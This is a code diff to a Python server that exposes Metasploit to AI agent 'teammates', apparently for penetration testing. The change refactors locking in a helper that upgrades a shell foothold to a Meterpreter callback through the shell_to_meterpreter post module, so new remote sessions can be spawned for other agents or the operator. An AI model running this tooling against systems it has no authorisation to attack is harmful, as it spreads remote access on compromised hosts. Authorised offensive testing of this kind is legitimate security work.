@@ -725,46 +725,61 @@ def create_server() -> FastMCP:
     def _spawn_sibling(session_id: str, lhost: str, lport: int, label: str) -> dict:
         """Shared spawn primitive: re-stage a fresh session from a SHELL foothold
         via shell_to_meterpreter and return the new session id. Returns a dict:
-        {new_sid} on success, or {needs_manual|unconfirmed|error} otherwise."""
+        {new_sid} on success, or {needs_manual|unconfirmed|error} otherwise.
+
+        Locking is fine-grained: the RPC lock is held only for the pre-checks +
+        module launch and for each brief poll read, and RELEASED during the 1s
+        sleeps. Holding it across the whole ~30s poll would block every other
+        teammate's Metasploit call for the duration of a spawn — so the spawn
+        tools are intentionally NOT @_serialized; this function serializes just
+        its own RPC touches.
+        """
         try:
             validate_option_value(lhost)
         except ValidationError as e:
             return {"error": f"{e}"}
-        client, err = _require_client()
-        if err:
-            return {"error": err}
-        sessions = client.sessions.list
-        if str(session_id) not in {str(k) for k in sessions}:
-            return {"error": f"Session {session_id} not found or dead."}
-        key = int(session_id) if str(session_id).isdigit() else session_id
-        stype = str(sessions[key].get("type", ""))
-        if "meterpreter" in stype.lower():
-            return {"needs_manual": (
-                "Source is a Meterpreter session — can't re-stage a sibling from "
-                "here. Catch another callback (or open one in tmux) and reserve/"
-                "assign it manually."
-            )}
-        before = {str(k) for k in sessions}
-        try:
-            mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
-            mod["SESSION"] = int(session_id)
-            mod["LHOST"] = lhost
-            mod["LPORT"] = int(lport)
-            result = mod.execute()
-            err_msg = _execute_error(result, expect_job=True)
-            if err_msg:
-                return {"error": f"{label} spawn failed: {err_msg}"}
-        except Exception as e:
-            return {"error": f"{label} spawn failed: {e}"}
+        with _rpc_lock:
+            client, err = _require_client()
+            if err:
+                return {"error": err}
+            sessions = client.sessions.list
+            if str(session_id) not in {str(k) for k in sessions}:
+                return {"error": f"Session {session_id} not found or dead."}
+            key = int(session_id) if str(session_id).isdigit() else session_id
+            stype = str(sessions[key].get("type", ""))
+            if "meterpreter" in stype.lower():
+                return {"needs_manual": (
+                    "Source is a Meterpreter session — can't re-stage a sibling from "
+                    "here. Catch another callback (or open one in tmux) and reserve/"
+                    "assign it manually."
+                )}
+            before = {str(k) for k in sessions}
+            try:
+                mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
+                mod["SESSION"] = int(session_id)
+                mod["LHOST"] = lhost
+                mod["LPORT"] = int(lport)
+                result = mod.execute()
+                err_msg = _execute_error(result, expect_job=True)
+                if err_msg:
+                    return {"error": f"{label} spawn failed: {err_msg}"}
+            except Exception as e:
+                return {"error": f"{label} spawn failed: {e}"}
+        # Poll for the new session WITHOUT holding the lock across sleeps —
+        # reacquire briefly for each read so other teammates' calls interleave.
         for _ in range(30):
             time.sleep(1)
-            fresh = {str(k) for k in client.sessions.list} - before
+            with _rpc_lock:
+                now = {str(k) for k in client.sessions.list}
+            fresh = now - before
             if fresh:
                 return {"new_sid": sorted(fresh, key=lambda s: int(s) if s.isdigit() else s)[-1]}
         return {"unconfirmed": result.get("job_id")}
 
     @mcp.tool()
-    @_serialized
+    # NOT @_serialized — the RPC work is inside _spawn_sibling, which locks
+    # per-op and releases during its poll so a spawn doesn't block other
+    # teammates' Metasploit calls for ~30s.
     def spawn_session(session_id: str = "", lhost: str = "", lport: int = 0) -> str:
         """Spawn a SECOND session from a foothold for a DIFFERENT AGENT to use.
 
@@ -796,7 +811,8 @@ def create_server() -> FastMCP:
                            "from_session_id": str(session_id)})
 
     @mcp.tool()
-    @_serialized
+    # NOT @_serialized — see spawn_session; _spawn_sibling locks per-op so the
+    # poll doesn't hold the global RPC lock.
     def spawn_operator_session(session_id: str = "", lhost: str = "", lport: int = 4444) -> str:
         """Spawn a SECOND session from a foothold and reserve it for the operator.
 
